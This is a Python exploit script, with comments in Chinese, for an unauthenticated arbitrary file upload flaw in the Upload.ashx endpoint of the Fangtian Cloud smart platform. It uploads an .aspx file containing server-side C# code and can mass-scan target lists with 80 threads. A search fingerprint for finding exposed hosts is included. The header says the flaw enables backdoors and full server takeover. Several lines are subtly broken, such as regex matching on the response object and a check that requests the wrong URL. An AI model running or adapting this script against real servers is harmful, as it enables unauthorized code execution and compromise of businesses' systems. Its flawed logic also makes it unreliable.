# 方天云智慧平台系统 Upload.ashx 任意文件上传漏洞
# body="AjaxMethods.asmx/GetCompanyItem"
# 产品简介:方天云智慧平台系统，作为方天科技公司的重要产品，是一款面向企业全流程的业务管理功能平台，集成了ERP（企业资源规划）、MES（车间执行系统）、APS（先进规划与排程）、PLM（产品生命周期）、CRM（客户关系管理）等多种功能模块，旨在通过云端服务为企业提供数字化、智能化的管理解决方案。
# 漏洞概述:方天云智慧平台系统 Upload.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
           ____________  __    __  __     __             __
          / __/_  __/\ \/ /___/ / / /__  / /_ _____ ____/ /
         / _/  / /    \  /___/ /_/ / _ \/ / // / _ `/ _  / 
        /_/   /_/     /_/    \____/ .__/_/\_,_/\_,_/\_,_/  
                                 /_/                       
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
--author:Kucei  --Version:方天云智慧平台系统_Upload_ashx-UploadFile
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('方天云智慧平台系统_Upload_ashx-UploadFile')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/Upload.ashx'
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX',
        'Connection': 'close',
    }
    headers2 ={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'}
    data = '------WebKitFormBoundarySl8siBbmVicABvTX\r\nContent-Disposition: form-data; name="file"; filename="test123.aspx"\r\nContent-Type: image/jpeg\r\n\n<%@Page Language="C#"%><%Response.Write("123456");System.IO.File.Delete(Request.PhysicalPath);%>\r\n------WebKitFormBoundarySl8siBbmVicABvTX--'
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    try :
        response = requests.post(url=target+url_payload,headers=headers1,data=data,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        pattern = r'\d{19}\.aspx'
        math = re.search(pattern,response)
        if response.status_code == 200 and math != ' ':
            response = requests.get(url=target+url_payload,headers=headers2,verify=False,timeout=5)
            url_payload = '/UploadFile/CustomerFile/'+ math
            if response.status_code == 200 and response.text == '123456':
                print( f"[+] {target} 存在漏洞！\n")
                with open('方天云智慧平台系统_Upload_ashx-UploadFile.txt','a',encoding='utf-8')as f:
                    f.write(target+url_payload+'\n')
                    return True
            else:
                print("[-] 不存在漏洞！！")
                return False
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()